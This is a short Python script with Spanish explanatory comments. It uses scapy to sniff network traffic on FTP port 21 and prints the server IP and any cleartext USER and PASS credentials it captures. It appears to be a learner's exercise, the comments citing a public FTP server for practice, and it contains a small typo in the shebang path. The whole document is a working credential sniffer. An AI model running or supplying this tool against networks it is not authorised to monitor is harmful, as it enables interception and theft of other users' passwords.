#! /ur/bin/env python3
#__ coding: utf8__

#Servidor ftp publico : ftp.openwall.com

import argparse
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument('-i','--interface',help="Interfaz de red")
parser = parser.parse_args()

def sniffer_ftp(pkt): #pkt = packet
    if pkt[TCP].dport == 21: #pkt practicamente será una lista, así que hay que acceder a sus capas
    # NOTE: dport = destination port como propiedad de pkt
    # NOTE: En otras palabras ese condicional quiere decir lo siguiente:
        #Verifica si se está enviando el paquete al puerto 21
        data = pkt.sprintf("%Raw.load%") #La funcion sprintf recibe como argumento la capa y la propiedad a la cual queremos acceder
        # NOTE: La funcion sprintf tratará de acceder a la capa Raw y a la propiedad load
        #no todos los paquetes tienen capa Raw, en ese caso el resultado son signos de interrogación
        #es una manera mas eficiente de trabajar con try & except

        if "USER" in data: #USER en mayuscula porque así te sale cuando te intentas logear en un servidor ftp como un mensjae grande
            print("--> FTP IP: " + pkt[IP].dst)
            #Aqui vamos a imprimit la direccion ip del servidor FTP
            #La direccion se encuentra en el paquete (pkt), en la capa IP y dst es la direccion IP del servidor FTP

            data = data.split(" ")
            data = data[1]
            print('[+] Possible ftp user: ' + data) #Esto solo es en caso de que haya encontrado un posible usuario en los mensajes que esten enviando en lso paquetes al puerto 21

        elif "PASS" in data: #PASS en mayusculas hace referencia a password y si se encuentra PASS en un mensaje o paquete ftp, hace refrencia a la contraseña
            data = data.split(" ")
            data = data[1]
            print('[+] PASSWORD: ' + data)

def main():
    if parser.interface:
        print()
        print(' [--] Corriendo sniffer [--]\n') #A ftp le corresponde el puerto 21
        sniff(iface = parser.interface, filter = "tcp and port 21", prn=sniffer_ftp)# NOTE: La funcion sniff tiene como parametro "prn" que nos permite mandar todos los paquetes a otra funcion con los cuales se pueden trabajar

    else:
        print('Introduce una interfaz de red')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit(0)